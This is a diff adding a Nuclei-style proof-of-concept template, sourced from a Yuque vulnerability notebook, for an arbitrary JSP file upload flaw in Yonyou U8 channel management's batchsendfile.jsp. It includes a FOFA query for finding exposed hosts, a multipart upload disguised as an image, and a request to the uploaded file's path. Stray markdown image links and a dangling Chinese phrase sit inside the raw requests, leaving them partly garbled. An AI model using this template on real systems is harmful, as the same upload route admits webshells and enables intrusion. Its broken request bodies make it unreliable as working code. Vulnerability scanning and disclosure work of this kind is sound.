@@ -1,0 +1,59 @@
+id: poc-tgm1nmt4xyrqv966
+info:
+  name: 用友U8 渠道管理(高级版)batchsendfile存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgm1nmt4xyrqv966'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tgm1nmt4xyrqv966
+    fofa: title="渠道管理（高级版）" ||"common/images/dot.gif" && (icon_hash="737647198" || icon_hash="84729000")
+http:
+- raw:
+  - 'POST /business/common/lxgzds/batchsendfile.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2yTv7wNpLm
+
+    Accept: */*
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryXqK9dR2yTv7wNpLm
+
+    Content-Disposition: form-data; name="file"; filename="hello.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.println("HelloWorld");%>
+
+    ------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711665864-c944cd97-c45e-4dd7-bccd-57075881b0ea.png)
+
+    访问后缀'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /userfile/default/temp/2c9ff25297c54acc019873fcd9ba0045.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754711666081-f66fe8dd-8d01-4121-bdc9-99be163ac9a7.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
